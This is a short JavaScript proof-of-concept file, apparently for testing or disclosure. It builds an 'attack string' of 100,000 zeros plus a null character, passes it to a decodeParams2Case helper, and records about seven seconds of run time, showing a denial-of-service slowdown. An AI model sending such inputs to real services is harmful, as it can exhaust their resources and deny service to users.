const { decodeParams2Case } = require("./perf_helpfunc.js");

//Attack String :""+"0"*100000+"\u0000"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "0";
}
str += "\u0000";

var result = decodeParams2Case(str, "", "");

// real    0m7.175s
// user    0m7.130s
// sys     0m0.030s
